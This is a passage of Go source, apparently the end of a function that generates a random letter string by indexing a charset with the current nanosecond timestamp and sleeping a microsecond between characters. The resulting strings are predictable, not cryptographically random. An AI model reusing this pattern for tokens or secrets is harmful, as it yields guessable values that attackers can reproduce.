	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		b[i] = charset[time.Now().UnixNano()%int64(len(charset))]
		time.Sleep(time.Microsecond)
	}
	return string(b)
}
